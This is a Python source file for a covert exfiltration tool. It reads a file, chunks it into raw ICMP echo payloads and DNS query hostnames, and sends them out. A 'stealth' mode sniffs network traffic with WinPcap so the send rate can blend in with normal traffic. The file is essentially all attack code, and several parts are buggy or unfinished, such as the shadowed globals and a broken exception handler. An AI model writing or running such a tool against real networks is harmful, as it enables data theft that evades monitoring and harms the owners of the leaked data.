import argparse
import base64
import binascii
import ctypes
import math
import platform
import random
import socket
import string
import struct
import sys
import threading
import time

from ctypes import *
from sys import argv
from winpcapy import *

u_char      = c_ubyte
u_int       = c_int
u_short     = c_ushort

chunkLength         = 20
completedTransfer   = False
currentFilePath     = "src.exe"
exfilBytes          = b''
ICMP_ECHO_REPLY     = 0
ICMP_ECHO_REQUEST   = 8
intervalLength      = 5
startByte           = 0
updatedPPI          = 10

DNS_REQUEST     = 0
ICMP_PROTOCOL   = socket.getprotobyname('icmp')
UDP_PROTOCOL    = socket.getprotobyname('udp')

# Command line flags
stealthMode = False
fastMode    = False
ppsMode     = (False,0)
icmpOnly    = False
dnsOnly     = False
mixedOnly   = False

monitorThread = None

serverAddress = "192.168.2.13"

class ICMPPacket:
    def __init__(self, type, code, data):
        self.type = type
        self.code = code
        self.data = data

    def computeChecksum():
        return
    
    def getHeader(self):
        # Type (8), code(8), checksum(16), id(16), sequence(16)
        packetId = int((id(self) * random.random()) % 65535)
        icmpHeader = struct.pack("bbHHh", self.type, self.code, 0, packetId, 0)
        return icmpHeader

    def construct(self):
        header = self.getHeader()
        return header + self.data

    
class DNSPacket:
    def __init__(self, data):
        self.data = data
        self.QR = 0

    def computeChecksum():
        return
        
    def getHeader(self, length):
        # ID (16), QR(1), OpCode(4), AA(1), TC(1), RD(1), RA(1), Z(1), RCode(16), QDCount(16), ANCount(16), NSCount(16), ARCount(16)
        # All flags are 0 so we can just use an unsigned short (16 bytes) of 0

        packetId = int((id(self) * random.random()) % 65535)
        
        # DNS uses UDP so create UDP header first
        #udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(8 + 18 + 4*math.ceil(chunkLength/3)), 0)
        udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(length), 0)
        dnsHeader = struct.pack("HHHHHH", socket.htons(packetId), 0, socket.htons(1), 0, 0, 0)
        return udpHeader + dnsHeader

    def construct(self):
        # Add hostname terminating byte and final two options
        end = struct.pack("HH", socket.htons(1), socket.htons(1))
        length = len(self.data) + len(end) + 20
        header = self.getHeader(length)

        print("Total packet length: %d" % length)
        return header + self.data + end

def main(q):
    global stealthMode
    global fastMode
    global ppsMode
    global icmpOnly
    global dnsOnly
    global mixedOnly

    parser = argparse.ArgumentParser(description="Set options for exfiltration")
    parser.add_argument('-s', dest="stealth", action="store_true", default=False, required=False)
    parser.add_argument('-f', dest="fast", action="store_true", default=False, required=False)
    parser.add_argument('-i', dest="icmp", action="store_true", default=False, required=False)
    parser.add_argument('-d', dest="dns", action="store_true", default=False, required=False)
    parser.add_argument('-m', dest="mixed", action="store_true", default=False, required=False)
    parser.add_argument("-p", dest="pps", type=int, default=0)

    args = parser.parse_args()

    # Check constraints on arguments
    ret = False
    if args.stealth & args.fast:
        print("Error: -s and -f are mutually exclusive")
        ret = True
    if args.icmp & args.dns:
        print("Error: Use -m for ICMP and DNS")
        ret = True
    if (args.icmp | args.dns) & args.mixed:
        print("Error: Use -m without -i or -d")
        ret = True
    if args.mixed & (args.pps != 0):
        print("Error: -m and -p are mutually exclusive")
    if ret:
        # Return after all errors have been printed
        return

    if args.pps != 0:
        ppsMode = (True, args.pps)

    stealthMode = args.stealth
    fastMode    = args.fast
    icmpOnly    = args.icmp
    dnsOnly     = args.dns
    mixedOnly   = args.mixed

    init()

    return

    
def init():
    global exfilBytes
    global sendSocket
    
    startByte = 0
    exfilBytes = readFile(currentFilePath, "rb")
    sendSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sendSocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    if stealthMode:     
        monitorThread = threading.Thread(None, monitorNetwork)
        monitorThread.start()
    loop()

def loop():

    if stealthMode:
        k = 48 # Constant of proportionality between delay and ppi
        localPPI = updatedPPI
        delay = k / localPPI
    elif ppsMode[0]:
        delay = 1/ppsMode[1]

    # While the whole file hasn't be exfiltrated
    while startByte < (len(exfilBytes) - 1):
        if stealthMode:       
            print("localPPI: %d updatedPPI: %d" % (localPPI, updatedPPI))
            # If the monitor has updated the PPI value, then update the delay between packets
            if localPPI != updatedPPI:
                print("Updating delay")
                localPPI = updatedPPI
                delay = k/localPPI
                print("New delay: %f" % (delay))        

        # Send next chunk
        nextPacketType = getNextPacketType()
        if nextPacketType == ICMP_PROTOCOL:
            print("ICMP packet sent")
            packet = createICMPPacket("127.0.0.1", "127.0.0.1")
        elif nextPacketType == UDP_PROTOCOL:
            print("DNS packet sent")
            packet = createDNSPacket("127.0.0.1", "127.0.0.1")
        sendNext("127.0.0.1", nextPacketType, packet)

        if stealthMode | ppsMode[0]:
            time.sleep(delay)

    sendEndOfFile()

    completedTransfer = True

    return
    
def getNextPacketType():
    if icmpOnly:
        print("Packet type: ICMP")
        return ICMP_PROTOCOL
    elif dnsOnly:
        print("Packet type: DNS")
        return UDP_PROTOCOL
    else:
        protos = [ICMP_PROTOCOL, UDP_PROTOCOL]
        return protos[math.floor(random.random() * len(protos))]

def createICMPPacket(src, dst):
    ipHeader = getIPHeader(src, dst, 1)
    data = getNextChunk(startByte, chunkLength)
    icmpPacket = ICMPPacket(ICMP_ECHO_REQUEST, 0, data).construct()
    
    return ipHeader + icmpPacket

def createDNSPacket(src, dst):
    ipHeader = getIPHeader(src, dst, 17)

    queryHostname = b''
    #fileData = getNextChunk(startByte, 248)
    #queryHostname = prepareDataForDNS(fileData)

    if fastMode == True:
        print("Creating fast mode DNS packet")
        # (62).(62).(62).(62)
        for i in range(0, 4):
            chunkLength = 62
            data = getNextChunk(startByte, chunkLength)
            #data = base64.b32encode(data)
            data = len(data).to_bytes(1, "little") + data
            queryHostname += data

        queryHostname += (0).to_bytes(1, "big") # Add null terminating byte to domain name
    else:
        # Adjust chunk length accordingly
        for i in range(0, 4):
            chunkLength = math.floor(random.random() * 62) + 1
            data = getNextChunk(startByte, chunkLength)
            #data = base64.b32encode(data)
            data = len(data).to_bytes(1, "little") + data
            queryHostname += data

        queryHostname += (0).to_bytes(1, "big") # Add null terminating byte to domain name

    dnsPacket = DNSPacket(queryHostname).construct()

    return ipHeader + dnsPacket

def getIPHeader(src, dst, proto):
    version = 4
    IHL = 5
    DSCP = 0
    ECN = 0
    totalLength = 40
    identification = math.floor(random.random() * 65536)
    flags = 0
    fragmentOffset = 0
    timeToLive = 128
    protocol = proto
    headerChecksum = 0
    sourceIP = socket.inet_aton(src)
    destIP = socket.inet_aton(dst)
    options = 0

    version_IHL = (version << 4) | IHL
    DSCP_ECN = (DSCP << 2) | ECN
    flags_fragmentOffset = (flags << 13) | fragmentOffset

    # The '!' ensures all arguments are converted to network byte order
    header = struct.pack("!BBHHHBBH4s4s", version_IHL, DSCP_ECN, totalLength, identification, flags_fragmentOffset, timeToLive, protocol, headerChecksum, sourceIP, destIP)
    return header

def stringToDNSQuery(s):
    labels = s.split(".")
    output = ""
    for i in range(len(labels)):
        output += str(len(labels[i])) + labels[i]
    output += '0' # Add labels terminator
    return output

def getNextChunk(sb, cl):
    global startByte
    chunk = b''
    # Check if chunk overlaps end of file
    if (sb + cl) > (len(exfilBytes) - 1):
        # If yes then set the chunk size to the remainder of the file
        chunkLength = len(exfilBytes) - sb

        # Need to send EOF
    for i in range(sb, sb + cl):
        chunk += exfilBytes[i:i+1]
    startByte += cl
    return chunk

def sendStartOfFile():
    return
    
def sendEndOfFile():
    nextType = getNextPacketType()
    if nextType == ICMP_PROTOCOL:
        content =  ICMP("Completed".encode())
        sendNext("127.0.0.1", ICMP_PROTOCOL, content)
    elif nextType == UDP_PROTOCOL:
        ipHeader = getIPHeader("127.0.0.1", "127.0.0.1", 17)
        content =  DNSPacket((9).to_bytes(1, "little") + "Completed".encode()  + (0).to_bytes(1, "little")).construct()
        sendNext("127.0.0.1", UDP_PROTOCOL, ipHeader + content)
    print("Sent end of file")
    return
    
def stringToBin(s):
    b = bytearray()
    for i in s:
        if i.isdigit() != True:
            b.append(ord(i))
        else:
            b.append(int(i))

    # Convert bytes to bin endian
    for i in b:
        if isinstance(i, int) != True:
            i = socket.htons(i)
    return b
  
def readFile(name, mode):
    fileBytes = b''
    # Use 'rb' mode for reading in binary
    f = open(name, mode)
    try:
        byte = f.read(1)
        while byte != b'':
            fileBytes += byte
            byte = f.read(1)
    finally:
        f.close()
    return fileBytes

def sendNext(dest_addr, code, packet, timeout=1):
    try:
        host = socket.gethostbyname(dest_addr)
    except socket.gaierror:
        return 
    while packet:
        # The icmp protocol does not use a port, but the function
        # below expects it, so we just give it a dummy port.
        if code == ICMP_PROTOCOL:
            print("Sending ICMP packet")
            sent = sendSocket.sendto(packet, (dest_addr, 1))
        elif code == UDP_PROTOCOL:
            print("Sending DNS packet")
            sent = sendSocket.sendto(packet, (dest_addr, 53))
        packet = packet[sent:]

    return

def closeAllSocket():
    try:
        sendICMPSocket.close()
        sendDNSSocket.close()
    except e:
        print(e)

class ip_address(Structure):
    _fields_ = [("byte1", u_char),
                ("byte2", u_char),
                ("byte3", u_char),
                ("byte4", u_char)]


class ip_header(BigEndianStructure):
    _fields_ = [("ver_ihl", u_char),
                ("tos", u_char),
                ("tlen", u_short),
                ("identification", u_short),
                ("flags_fo", u_short),
                ("ttl", u_char),
                ("proto", u_char),
                ("crc", u_short),
                ("saddr", ip_address),
                ("daddr", ip_address),
                ("op_pad", u_int)]


class udp_header(BigEndianStructure):
    _fields_ = [("sport", u_short),
                ("dport", u_short),
                ("len", u_short),
                ("crc", u_short)]

pktCount = 0
intervalTime = 10
capturing = True
captureLength = 2
timeBetweenListens = 5

if platform.python_version()[0] == "3":
    raw_input=input
#/* prototype of the packet handler */
#void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
PHAND=CFUNCTYPE(None,POINTER(c_ubyte),POINTER(pcap_pkthdr),POINTER(c_ubyte))

def monitorNetwork():
    global capturing
    global updatedPPI
    
    packet_handler=PHAND(_packet_handler)
    alldevs=POINTER(pcap_if_t)()
    errbuf= create_string_buffer(PCAP_ERRBUF_SIZE)
    ## Retrieve the device list
    if (pcap_findalldevs(byref(alldevs), errbuf) == -1):
            print ("Error in pcap_findalldevs: %s\n" % errbuf.value)
            sys.exit(1)
    '''
    ## Print the list
    i=0
    try:
            d=alldevs.contents
    except:
            print ("Error in pcap_findalldevs: %s" % errbuf.value)
            print ("Maybe you need admin privilege?\n")
            sys.exit(1)
    while d:
            i=i+1
            print("%d. %s" % (i, d.name))
            if (d.description):
                    print (" (%s)\n" % (d.description))
            else:
                    print (" (No description available)\n")
            if d.next:
                    d=d.next.contents
            else:
                    d=False

    if (i==0):
            print ("\nNo interfaces found! Make sure WinPcap is installed.\n")
            sys.exit(-1)
    print ("Enter the interface number (1-%d):" % (i))
    inum= raw_input('--> ')
    if inum in string.digits:
            inum=int(inum)
    else:
            inum=0
    if ((inum < 1) | (inum > i)):
            print ("\nInterface number out of range.\n")
            ## Free the device list
            pcap_freealldevs(alldevs)
            sys.exit(-1)
    '''
    inum = 5
    ## Jump to the selected adapter
    d=alldevs
    for i in range(0,inum-1):
            d=d.contents.next
    ## Open the device 
    ## Open the adapter
    d=d.contents
    adhandle = pcap_open_live(d.name,65536,1,1000,errbuf)
    if (adhandle == None):
            print("\nUnable to open the adapter. %s is not supported by Pcap-WinPcap\n" % d.contents.name)
            ## Free the device list
            pcap_freealldevs(alldevs)
            sys.exit(-1)
    print("\nlistening on %s...\n" % (d.description))
    ## At this point, we don't need any more the device list. Free it
    pcap_freealldevs(alldevs)
    # Start capturing, set large packet capture size because we want to stop before this is reached

    while not completedTransfer:
        print("Starting capture")
        start = time.clock()
        pktCount = 0
        while(capturing):
            pcap_dispatch(adhandle, 1, packet_handler, None)
            pktCount += 1
            if (time.clock() - start) >= captureLength:
                break;
        #pcap_close(adhandle)
        #print("Number of packets received in %d seconds: %d" % (captureLength, pktCount))
        updatedPPI = pktCount
        print("updatedPPI: %d" % (pktCount))
        time.sleep(timeBetweenListens)
    return

def _packet_handler(param,header,pkt_data):
    global pktCount
    '''
    # cast pkt_data to void so we can do some pointer arithmetic
    v_pkt_data = ctypes.cast(pkt_data, ctypes.c_void_p)

    # retrieve the position of the ip header
    v_ip_header = ctypes.c_void_p(v_pkt_data.value + 14)
    pih = ctypes.cast(v_ip_header, ctypes.POINTER(ip_header))
    ih = pih.contents

    # retrieve the position of the udp header
    ip_len = (ih.ver_ihl & 0xf) * 4
    uh = ctypes.cast(ctypes.cast(pih, ctypes.c_void_p).value + ip_len,
                     ctypes.POINTER(udp_header)).contents

    # convert from network byte order to host byte order
    sport = socket.ntohs(uh.sport)
    dport = socket.ntohs(uh.dport)

    print("{}.{}.{}.{}:{} -> {}.{}.{}.{}:{}".format(
        ih.saddr.byte1, ih.saddr.byte2, ih.saddr.byte3, ih.saddr.byte4, sport,
        ih.daddr.byte1, ih.daddr.byte2, ih.daddr.byte3, ih.daddr.byte4, dport))

    # Extracting data
    #

    # data offset from ip header start
    data_offset = ip_len + ctypes.sizeof(udp_header)
    # data length
    data_len = ih.tlen - ip_len - ctypes.sizeof(udp_header)
    # get data
    arr_type = (ctypes.c_uint8 * data_len)
    data = arr_type.from_address(v_ip_header.value + data_offset)

    #print(data[0:data_len])

    # note: same thing could be achieved from pkt_data
    #print(pkt_data[14+data_offset:14+data_offset+data_len])
    '''
    # Record values relating to the packet type
    pktCount += 1
    return

if __name__ == "__main__":
    main(sys.argv)
